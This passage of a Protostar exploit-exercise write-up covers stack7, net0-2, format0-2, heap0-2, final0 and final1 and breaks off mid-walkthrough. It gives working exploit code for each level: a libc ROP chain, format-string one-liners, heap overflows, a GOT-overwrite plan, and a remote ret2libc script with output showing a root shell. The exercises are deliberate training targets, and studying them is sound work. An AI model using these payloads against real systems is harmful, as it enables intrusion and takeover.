ubuntu     29658  0.0  0.0   2028   556 pts/5    t    13:12   0:00 /home/ubuntu/workspace/proto/stack7
ubuntu     29686  0.0  0.0  10556  1608 pts/5    S+   13:13   0:00 grep --color=auto stack7
le91688:~/workspace/proto (master) $ cat /proc/29658/maps
08048000-08049000 r-xp 00000000 00:245 386                               /home/ubuntu/workspace/proto/stack7
08049000-0804a000 rwxp 00000000 00:245 386                               /home/ubuntu/workspace/proto/stack7
55555000-55575000 r-xp 00000000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55575000-55576000 r-xp 0001f000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55576000-55577000 rwxp 00020000 00:245 9405                              /lib/i386-linux-gnu/ld-2.19.so
55577000-55579000 r--p 00000000 00:00 0                                  [vvar]
55579000-5557a000 r-xp 00000000 00:00 0                                  [vdso]
5557a000-5557c000 rwxp 00000000 00:00 0 
5558e000-55736000 r-xp 00000000 00:245 9410   Target------------->       /lib/i386-linux-gnu/libc-2.19.so   
55736000-55737000 ---p 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
55737000-55739000 r-xp 001a8000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
55739000-5573a000 rwxp 001aa000 00:245 9410                              /lib/i386-linux-gnu/libc-2.19.so
5573a000-5573e000 rwxp 00000000 00:00 0 
fffdd000-ffffe000 rwxp 00000000 00:00 0  
```

So we have can see that our library libc-2.19.so is loaded in memory starting at 0x5558e000 and our binsh pointer value needs to be 0x556ee84c


We are starting to get a pile of info, but I promise it will all come together soon, beautifully!
Next, lets design our stack:


```nasm
higher memory
+----------------------+
|   INT0x80            |  syscall should be "execve( "/bin/sh",0,0)
+----------------------+
|   add eax, 0xb ; ret |  add 0xb to EAX (to call execve with 11)
+----------------------+
|   xor eax,eax ; ret  |  ensure EAX is 0
+----------------------+
|   \x00\x00\x00\x00   |
+----------------------+
|   ptr to "/bin/sh/"  |  
+----------------------+
|pop $ecx,pop $ebx; ret|  load ECX with NULL and EBX with 'bin/sh'
+----------------------+
|  \x00\x00\x00\x00    |
+----------------------+
|   pop $edx, ret      |  load EDX with NULL
+----------------------+
|   EBP = "BBBB"       |  Our overflow
+----------------------+
|   filler A's         |  
---------------------- +
---lower memory---
```

Now we can put this all together with python

### Python script (ropchain.py):

```python
#!/usr/bin/env python
from struct import pack

lib_base = 0x5558e000              #base of our library

syscall     = lib_base + 0x0002e725
zero_eax    = lib_base + 0x0002f0ec
set_eax     = lib_base + 0x001454c6
pop_ecx_ebx = lib_base + 0x000f9482
pop_edx     = lib_base + 0x00001aa2
binsh_loc   = 0x556ee84c
null_val    = '\x00\x00\x00\x00'

#struct pack returns a string containing values packed in a certain format
#'<I' makes them little endian unsigned int's
#see here for more details https://docs.python.org/2/library/struct.html

p = 'a'*76    #fill buffer          #build our stack
p += 'bbbb'    #overflow ebp
p += pack('<I', pop_edx)    #pop edx; ret
p += null_val               #EDX = 0
p += pack('<I', pop_ecx_ebx)    #pop ecx; ret
p += null_val
p += pack('<I', binsh_loc)
p += pack('<I', zero_eax)
p += pack('<I', set_eax)
p += pack('<I', syscall)
    
print (p)                          #for simplicity I just printed the value
```

Now we use our cat trick to keep stdin open and get our shell!

### winning command:

```bash
le91688:~/workspace/proto (master) $ ulimit -s unlimited   <--- ensure lib randomization is off
le91688:~/workspace/proto$ python ./ropchain.py 
le91688:~/workspace/proto$ (cat testrop; cat) | ./stack7
input path please: got path aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXUaaaaaaaabbbbXU
ls
LIBCgadgets             format0          format3    heap4.asm    stack0.s          stack3exploit.py    ...
whoami
ubuntu
```

## net0

### Source Code:

```c
#include "../common/common.c"

#define NAME "net0"
#define UID 999
#define GID 999
#define PORT 2999

void run()
{
  unsigned int i;
  unsigned int wanted;

  wanted = random();

  printf("Please send '%d' as a little endian 32bit int\n", wanted);

  if(fread(&i, sizeof(i), 1, stdin) == NULL) {
      errx(1, ":(\n");
  }

  if(i == wanted) {
      printf("Thank you sir/madam\n");
  } else {
      printf("I'm sorry, you sent %d instead\n", i);
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :> */
  srandom(time(NULL));

  run();
}
```

### Plan:
This challenge introduces some socket programming. 

### Python exploit:

```python
import socket
import struct

target_host = "localhost"
target_port = 2999

#create socket obj
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect the client
client.connect ( (target_host,target_port))

#recieve initial data
prompt = client.recv(4096)
#split by ' into list
data = prompt.split("'")
#grab the 2nd element, which is our target "random" value
value= data[1]
#send value packed as little endian unsigned int
client.send (struct.pack('<I',int(value))) #pack as little endian
#recieve data
response = client.recv(4096)

print response
```


## net1

### Source Code:

```c
#include "../common/common.c"

#define NAME "net1"
#define UID 998
#define GID 998
#define PORT 2998

void run()
{
  char buf[12];
  char fub[12];
  char *q;

  unsigned int wanted;

  wanted = random();         //generate random value for wanted

  sprintf(fub, "%d", wanted);  //cast wanted as string in fub

  if(write(0, &wanted, sizeof(wanted)) != sizeof(wanted)) {   //write 4 bytes of wanted
      errx(1, ":(\n");
  }

  if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {              //fgets input from stdin
      errx(1, ":(\n");
  }

  q = strchr(buf, '\r'); if(q) *q = 0;
  q = strchr(buf, '\n'); if(q) *q = 0;

  if(strcmp(fub, buf) == 0) {                               //make sure they match
      printf("you correctly sent the data\n");
  } else {
      printf("you didn't send the data properly\n");
  }
}

int main(int argc, char **argv, char **envp)  #set up listener
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :> */
  srandom(time(NULL));

  run();
}
```

### Plan:
More socket programming with some value conversions 

### Python solution:

```python
import socket
import struct

target_host = "localhost"
target_port = 2998
NULL= '\x00'

#create socket obj
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect the client
client.connect ( (target_host,target_port))

#get wanted variable
wanted = client.recv(4096)
#unpack wanted as an unsigned int
unpacked = struct.unpack('=I',fub)

print "sending ", str(unpacked[0])
#cast the unsigned int as string and send
client.send (str(unpacked[0]) )
#add null byte just in case
client.send (NULL)

#get response
response = client.recv(4096)
print response
```

## Net2

### Source Code:

```c
#include "../common/common.c"

#define NAME "net2"
#define UID 997
#define GID 997
#define PORT 2997

void run()
{
  unsigned int quad[4];
  int i;
  unsigned int result, wanted;

  result = 0;
  for(i = 0; i < 4; i++) {        
      quad[i] = random();  //populate array quad with random unsigned ints
      result += quad[i];   //sum all elements of quad as unsigned int in result 

      if(write(0, &(quad[i]), sizeof(result)) != sizeof(result)) {   //print to the socket
          errx(1, ":(\n");                  
      }
  }

  if(read(0, &wanted, sizeof(result)) != sizeof(result)) { //read your input
      errx(1, ":<\n");
  }


  if(result == wanted) {                            //goals
      printf("you added them correctly\n");
  } else {
      printf("sorry, try again. invalid\n");
  }
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  /* Don't do this :> */
  srandom(time(NULL));

  run();
}
```

### Plan:
This one populates an array and sums the elements into result. It sends you a write() of each array element concatenated as a string.
So we split the string into an array, unpack each element, sum them up, then pack as an int and send it back!  See code comments for details

### Python:

```python
import socket
import struct
from ctypes import *
target_host = "localhost"
target_port = 2997

#create socket obj
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connect the client
client.connect ( (target_host,target_port))
#get quad elements concatted
var = client.recv(4096)

#split by 4
n=4
newlist = [var[i:i+n] for i in range(0, len(var), n)]

#unpack as an int
intlist = map(lambda x: struct.unpack('=I',x),newlist) 
#grab only first element of tuple
intlist = map(lambda x:x[0],intlist) 

#convert to unsigned int
summed = c_uint(sum(intlist))

#pack as int
packed = struct.pack('=I',summed.value)

#send data
client.send (packed) 

#get response
response = client.recv(4096)
print response
```



## Format0

### Source Code:

```c
incoming
```

### Plan:


### winning command:

```bash
./format0 $(python -c "print '%64d'+'\xef\xbe\xad\xde'")
```

### Python exploit:

```python
```

## Format1

### Source Code:

```c

```

### Plan:


### winning command:

```bash
./format1 $(python -c 'print "\x38\x96\x04\x08"+"aaaaaaaaaa"+"%127$n"')
```

### Python exploit:

```python
```


## Format2

### Source Code:

```

```

### Plan:


### winning command:

```bash
python -c 'print "\xe4\x96\x04\x08"+"%59x."+"%4$n"' | ./format2
```

### Python exploit:

```python
```


## heap0

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()  // our target function
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;    // sets function pointer to no winner, we will change this

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);  // where we overflow struct d to overwrite fp
  
  f->fp();                  // where fp is called

}
```

### Plan:

First heap exercise

So we check out the objdump and see the following things of interest

```nasm
08048464 <winner>:                              <- location we need to jump to
 8048464:	55                   	push   %ebp
 8048465:	89 e5                	mov    %esp,%ebp
 8048467:	83 ec 18             	sub    $0x18,%esp
 804846a:	c7 04 24 d0 85 04 08 	movl   $0x80485d0,(%esp)
 8048471:	e8 22 ff ff ff       	call   8048398 <puts@plt>
 8048476:	c9                   	leave  
 8048477:	c3                   	ret   
 
 0804848c <main>:
 804848c:	55                   	push   %ebp
 804848d:	89 e5                	mov    %esp,%ebp
 ...
 80484f2:	e8 71 fe ff ff       	call   8048368 <strcpy@plt>
 80484f7:	8b 44 24 1c          	mov    0x1c(%esp),%eax  <-- moves a ptr into eax   we'll set our breakpoint here
 80484fb:	8b 00                	mov    (%eax),%eax   < -- loads value from that ptr into eax
 80484fd:	ff d0                	call   *%eax          < --- calls function at location in eax
 80484ff:	c9                   	leave  
 8048500:	c3                   	ret
```

So we fire up GDB and check out the heap

```bash
$ gdb ./heap0
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Reading symbols from ./heap0...done.
gdb$ b *0x80484f7                         #set our breakpoint
Breakpoint 1 at 0x80484f7: file heap0/heap0.c, line 38.
gdb$ run aaaaaaaaaaaa                     #run with some garbage
gdb$ x/10wx $esp                 #check out our stack 
                                                      v-----------location moved to eax 
0xffffd090:     0x0804a008      0xffffd38e      0x0804a050      0xf7e494ad
0xffffd0a0:     0xf7fc13c4      0xf7ffd000      0x0804a008      0x0804a050
gdb$ x/20wx $eax                                #check out our heap                                                                     
0x804a008:      0x61616161      0x61616161      0x61616161      0x61616161
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a048:      0x00000000      0x00000011      0x08048478      0x00000000
                                                    ^----- our target to overwrite (*fp)
```

So now we just need to overflow our heap chunk to overwrite fp. Lets start by finding the offset.

```bash
gdb$ x $esp+0x1c
0xffffd0ac:     0x0804a050   <--- overwrite loc
gdb$ p $eax                   <--- start of heap chunk
$3 = 0x804a008
gdb$ p 0x0804a050-$eax
$4 = 0x48             <--- offset!
gdb$ 
```

Now we can throw together a python one liner to overflow fp with the address of  to winner()

```python           
                #pad offset      #new target
python -c "print 'a'*0x48 + '\x64\x84\x04\x08' "
```

### winning command:

```bash
./heap0 $(python -c "print 'a'*0x48+'\x64\x84\x04\x08'")
```

## heap1

### source:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));  //8
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));  //8 
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

### Plan:

So we see we're strcpying some data into internet.name which are both allocated 8 bytes. Our heap looks something like this

```nasm
lower addr
+----------------------+\
|    i1.priority =1    |  \   
+----------------------+    \    chunk1       
|     *i1.name         |     /
+----------------------+   /
|      ARGV1(8)        | /     <--- FIRST STRCPY
|                      |
+----------------------+
|    i2.priority =2    |\
+----------------------+  \
|    i2.*name          |    \
+----------------------+       chunk2
|      ARGV2(8)        |    /
|                      |  /    <----- SECOND STRCPY
+----------------------+/ 
higher addr
```

That means if we overwrite the pointer to name in i2, we can write strcpy data anywhere we want.
Lets take a look with GDB

```bash
gdb ./heap1
Reading symbols from ./heap1...done.
gdb$ disas main
...
   0x08048552 <+153>:   mov    %eax,(%esp)
   0x08048555 <+156>:   call   0x804838c <strcpy@plt>  <--- put breakpoint on strcpy call
   0x0804855a <+161>:   movl   $0x804864b,(%esp)
   0x08048561 <+168>:   call   0x80483cc <puts@plt> 
   0x08048566 <+173>:   leave  
   0x08048567 <+174>:   ret    
End of assembler dump.
gdb$ b *0x08048555
Breakpoint 1 at 0x8048555: file heap1/heap1.c, line 32.
gdb$ run aaaaaaaa
Breakpoint 1, 0x08048555 in main (argc=0x2, argv=0xffffd164) at heap1/heap1.c:32
32      heap1/heap1.c: No such file or directory.
gdb$ x/40wx $eax-40      
0x8049ff8:      0x00000000      0x00000000      0x00000000      0x00000011  <-- our heap
0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
0x804a018:      0x61616161      0x61616161      0x00000000      0x00000011  <input begins
0x804a028:      0x00000002      0x0804a038      0x00000000      0x00000011
                                    ^-------------------pointer to name, we need to overwrite this
...
gdb$ p 0x804a028+0x4  #get location of name ptr on heap
$1 = 0x804a02c
gdb$ p $1-0x804a018   #subtract the beginning of our input
$2 = 0x14             #offset
  #now lets try it out
gdb$ run $(python -c "print 'a'*0x14+'xxxx'")
Starting program: /home/ubuntu/workspace/exploit-exercises/protostar/binaries/heap1 $(python -c "print 'a'*0x14+'xxxx'")
--------------------------------------------------------------------------[regs]
  EAX: 0x78787878  EBX: 0xF7FC1000  ECX: 0xFFFFD390  EDX: 0x00000000  o d I t S z a P c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0xFFFFD0B8  ESP: 0xFFFFD090  EIP: 0x08048555
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x8048555 <main+156>:        call   0x804838c <strcpy@plt>                      #as you can see we're about to call strcpy 
   0x804855a <main+161>:        mov    DWORD PTR [esp],0x804864b                   # on 0x78787878 or 'xxxx'
   0x8048561 <main+168>:        call   0x80483cc <puts@plt>
   0x8048566 <main+173>:        leave  
   0x8048567 <main+174>:        ret    
   0x8048568:   nop
   0x8048569:   nop
   0x804856a:   nop
--------------------------------------------------------------------------------
```

Now we just have to figure out how we want to use this. We can overwrite the i2.name pointer to our stack, and then strcpy winner's location to that address, and when we return we can jump to it, but we need to make sure ASLR is off for this.
### winning command:


```bash
                               #ESP on ret of main                       #location of win
run $(python -c "print 'a'*20+'\x9c\xd0\xff\xff'") $(python -c "print '\x94\x84\x04\x08'")
```

## Heap2

### Source Code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {     //define struct auth
  char name[32];
  int auth;
};

struct auth *auth; //pointer to struct
char *service;      //pointer to char

int main(int argc, char **argv)
{
  char line[128];   //our buffer

  while(1) {  //infinite loop
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break; //fgets to our buffer from stdin
      
      if(strncmp(line, "auth ", 5) == 0) {    //if input = auth
          auth = malloc(sizeof(auth));        //allocate memory for struct auth (based on size of pointer auth!)
          memset(auth, 0, sizeof(auth));      //zero out
          if(strlen(line + 5) < 31) {         // check size of input after auth is <31
              strcpy(auth->name, line + 5);   // if so, copy to name field of auth struct (32 bytes)
          }
      }
      if(strncmp(line, "reset", 5) == 0) {  // if you enter reset, free auth
          free(auth);
      }
      if(strncmp(line, "service", 6) == 0) {  //strdups input into auth->name
          service = strdup(line + 7);
      }
      if(strncmp(line, "login", 5) == 0) {   //if you enter login
          if(auth->auth) {                   //check auth field of struct is set
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

### Walkthrough:
For this one, we just need to set auth->auth to win. Luckily, the program only mallocs the size of the pointer, not the struct as required. You can see in the assembly, where it checks if auth is set

```nasm
8048a72:	8d 44 24 10          	lea    eax,[esp+0x10]
 8048a76:	89 04 24             	mov    DWORD PTR [esp],eax
 8048a79:	e8 ce fd ff ff       	call   804884c <strncmp@plt>
 8048a7e:	85 c0                	test   eax,eax
 8048a80:	0f 85 bc fe ff ff    	jne    8048942 <main+0xe>
 8048a86:	a1 f4 b5 04 08       	mov    eax,ds:0x804b5f4
 8048a8b:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20] <---- 0x20 offset (or 32 decimal)
 8048a8e:	85 c0                	test   eax,eax
 8048a90:	74 11                	je     8048aa3 <main+0x16f>
 8048a92:	c7 04 24 a7 ad 04 08 	mov    DWORD PTR [esp],0x804ada7
```
We cant do a simple overflow because of the constraint of less than 31, but we can use the service feature to throw dat into our struct and overwrite the auth bit

### winning command:

```bash
[ auth = (nil), service = (nil) ]
auth xxxx
[ auth = 0x95bb008, service = (nil) ]
service aaaaaaaaaaaaaaaaaaaaaaaaaa
[ auth = 0x95bb008, service = 0x95bb018 ]
login
you have logged in already!
[ auth = 0x95bb008, service = 0x95bb018 ]

```

## final0 

###Source Code:

```c
#include "../common/common.c"

#define NAME "final0"
#define UID 0
#define GID 0
#define PORT 2995

/*
 * Read the username in from the network
 */

char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  username = get_username();
  
  printf("No such user %s\n", username);
}
```


### Walkthrough:


This challenge is a simple overflow, but this time, we need to debug a "remote" program. 
So basically the trick to this, is we attach to the running process 

```bash
l$ sudo ps aux |grep final0  #sudo bc we had to start final0 as sudo
root     21944  0.0  0.1   2060  1108 ?        Ss   14:19   0:00 /home/l/exploit-exercises/protostar/binaries/final0

l@ip-172-31-61-60:~$ sudo gdb -p 21944
Attaching to process 21944
Reading symbols from /home/l/exploit-exercises/protostar/binaries/final0...done.
Reading symbols from /lib32/libc.so.6...(no debugging symbols found)...done.
Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
0xf7fd8be9 in __kernel_vsyscall ()
gdb$ 
```

Now, if we try to send some data with netcat or python, we'll run into some issues. GDB is attached to the parent process which is currently a systemcall that provides our socket. When data is sent to the port, it will spawn a child process of our target binary and we need to debug that. We need to set a few things in gdb to make this work!

```bash
set follow-fork-mode child  #when the program spawns a child process, GDB will follow that
set detach-on-fork off      #stay attached to both processes when we fork
```
Now that we have set this up, we can use python to send some data and see useful data in gdb. I decided to just do a ret2libc rop for this challenge to get a shell. (if you need to know how this is done, check out [Stack6](#stack6) ;)
Check out the python exploit below---


### Python exploit:

```python
#! /usr/bin/python
import socket
import struct
import telnetlib

sys_loc = 0xf7e48940  #found with gdb print system
bin_loc = 0xf7f66e8b  #found with find systemloc,+999999999, "/bin/sh"
try:
    print("[*]Connecting to target")
    #create socket obj
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #connect the client
    client.connect ( ('127.0.0.1',2995))

    #payload
    p =  'a'*532   #our offset 
    p += struct.pack('<I', sys_loc)    
    p += 'bbbb' #fake ebp
    p += struct.pack('<I', bin_loc)
    p += '\n'
    print("[*]Sending Payload")
    client.send(p)
    print("enjoy your shell ;)")
    #interact w shell
    t = telnetlib.Telnet()
    t.sock = client
    t.interact()
except socket.errno:
    raise

```
### Winning command

```bash
l$ ./final0.py
[*]Connecting to target
[*]Sending Payload
enjoy your shell ;)
whoami
root
```

## Final1


### Source Code:

```c
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();

}
```

### Walkthrough:

So this exercise is a "remote blind format string". Looking at the source, it's not apparent that there is any format string vuln.  I started by sending some input to see what the program does.  If you give the input "username x" , it sets the username var to "x". Then when you do "login x" , it calls the logit function, which does an snprintf call, and a syslog call. 

before proceeding, if you are new to format string vulns 
[CodeArcana](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html) is a GREAT resource and helped me alot!
Please read and understand before continuing!

I started by throwing some input to test for format string vulns.

```zsh
➜  binaries git:(master) ✗ nc localhost 2994  ##connect to socket with netcat
[final1] $ username %n%n%n         # give input to test for format string
[final1] $ login %n%n%n
```
I simultaneously ran an ltrace on the process to see what was being called

```zsh
➜  ~ ps aux | grep final1  #find process
l         9247  0.0  0.8  54552  8544 pts/2    S+   12:19   0:01 vim final1.py
root     10460  0.0  0.1   2060  1184 ?        S    16:12   0:00 ./final1
l        10467  0.0  0.0  14620   932 pts/1    S+   16:13   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn final1
root     27488  0.0  0.1   2060  1196 ?        Ss   Jan27   0:00 ./final1
➜  ~ sudo ltrace -p 10460
[sudo] password for l: 
strchr("login %n%n%n\n", '\r')                                   = nil
strchr("login %n%n%n\n", '\n')                                   = "\n"
strncmp("login %n%n%n", "username ", 9)                          = -1
strncmp("login %n%n%n", "login ", 6)                             = 0
snprintf("Login from 127.0.0.1:56412 as [%"..., 512, "Login from %s as [%s] with passw"..., "127.0.0.1:56412", "%n%n%n", "%n%n%n") = 62
syslog(15, "Login from 127.0.0.1:56412 as [%"..., 0x8049ee4, 0x804a2a0, 0x804a220, 0xffffd6e6, 0, 0 <no return ...>
--- SIGSEGV (Segmentation fault) ---
+++ killed by SIGSEGV +++
➜  ~ 
```

We can see that its dying on the syslog call... So I pulled up GDB to take a closer look. I once again simultaneously fed the input from before with netcat while watching in GDB. 

```bash
Program received signal SIGSEGV, Segmentation fault.
0x555d4e2f in vfprintf () from /lib32/libc.so.6
gdb$ bt
#0  0x555d4e2f in vfprintf () from /lib32/libc.so.6
#1  0x55671aaf in __vsyslog_chk () from /lib32/libc.so.6
#2  0x55671b87 in syslog () from /lib32/libc.so.6
#3  0x080498ef in logit (pw=0xffffd6e6 "%n%n%n") at final1/final1.c:19
#4  0x080499ef in parser () at final1/final1.c:46
#5  0x08049b04 in main (argc=0x1, argv=0xffffd834, envp=0xffffd83c) at final1/final1.c:82
gdb$ 
```

We can see the segfault happened in vfprintf. 


Syslog calls vsyslog_chk which then calls vfprintf.


So now we know where our printf vuln is. The next step is to check out the call stack at the vfprintf call by setting a breakpoint there.


Syslog is also writing to /var/log/syslog, so we can use this to help us build our format string attack.


we give the following input with netcat

```bash
[final1] $ username AAAAAA %p %p %p %p %p %p %p %p
[final1] $ login AAAAAA %p %p %p %p %p %p %p %p
login failed
```

and get the following output in our syslog

```bash
Jan 27 12:42:04 ip-172-31-61-60 final1: 
Login from 127.0.0.1:56052 as [AAAAAA 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e] 
with password [AAAAAA 0x31206d6f 0x302e3732 0x312e302e 0x3036353a 0x61203235 0x415b2073 0x41414141 0x70252041]
```

We can do some testing with this to calculate our offsets.  

Here is our netcat input

```bash
➜  binaries git:(master) ✗ nc localhost 2994
[final1] $ username x
[final1] $ login AAAABBBB %p %p %p %p %p %p %p %p %p %p
login failed
[final1] $ login AAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
login failed
[final1] $ login AAAABBBBX %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p      login failed
[final1] $ login xAAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
login failed
[final1] $ login xxxAAAABBBB%19$     
login failed
[final1] $ login xxxAAAABBBB%19$p
login failed
[final1] $ login xxxAAAABBBB%20$p
login failed
[final1] $ login xxxAAAABBBB%21$p
login failed
[final1] $ 
```

And corresponding syslog output

```bash
Feb  2 16:32:04 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732]
Feb  2 16:32:43 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141415b 0x42424241]
Feb  2 16:33:36 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBBX 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141415b 0x42424241]
Feb  2 16:34:08 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xAAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141785b 0x42424141]
Feb  2 16:35:34 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB%]
Feb  2 16:35:47 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x7878785b]
Feb  2 16:36:02 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x41414141]
Feb  2 16:36:28 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x42424242]  
```
The goal here is to use %x$p to point to the location on the stack that we can control. As you can see in the end, we get this with 20 and 21 given our input.

Now that we have this, we can switch %p to %n to write arbitrary data to a target location.

For this challenge, i wanted to try something new, so I overwrote the GOT (global offset table) entry for strcpy. This is the portion of our program that points us to the strcpy function in the loaded library. 

```nasm
08048cbc <strcpy@plt>:
 8048cbc:	ff 25 70 a1 04 08    	jmp    *0x804a170    <---- see the jump?
 8048cc2:	68 f0 00 00 00       	push   $0xf0
 8048cc7:	e9 00 fe ff ff       	jmp    8048acc <_init+0x30>
```

As you can see this jumps to the location at 0x804a170
We will overwrite this with a location of some shellcode. Since we're going to jump to a location on the stack, make sure ASLR is off!

We need to build an input that looks like this

```xml
  <address><address+2>%<x>x%<offset>$hn%<y>x%<offset+1>$hn
```
